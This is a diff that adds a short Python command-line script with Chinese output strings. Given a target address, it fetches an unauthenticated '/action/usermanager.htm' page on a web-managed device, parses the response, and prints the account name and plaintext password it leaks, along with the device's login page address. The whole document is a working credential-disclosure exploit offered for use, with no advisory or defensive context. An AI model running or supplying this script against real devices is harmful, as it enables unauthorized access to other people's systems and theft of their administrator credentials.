@@ -1,0 +1,26 @@
+from optparse import OptionParser
+import requests
+import json
+
+def getpass(target):
+    r = requests.get( target + '/action/usermanager.htm')
+    #return r.text
+    s=json.loads(r.text)
+    s=str(s['rows'])
+    s=s.replace("[","")
+    s=s.replace("]","")
+    s=s.replace("\'","\"")
+    s2=json.loads(s)
+    print("账号:"+s2['user']+"，密码:"+s2['pwd']+"\n登录地址为:"+target+"/login.html")
+
+def main():
+    usage = "usage: python3 %prog -t 目标(格式：http://1.1.1.1)"
+    parser = OptionParser(usage=usage)
+    parser.add_option('-t', dest='target',type='string',help='目标ip')
+    (options, args) = parser.parse_args()
+    target = options.target
+    if target:
+        getpass(target)
+
+if __name__ == "__main__":
+    main()
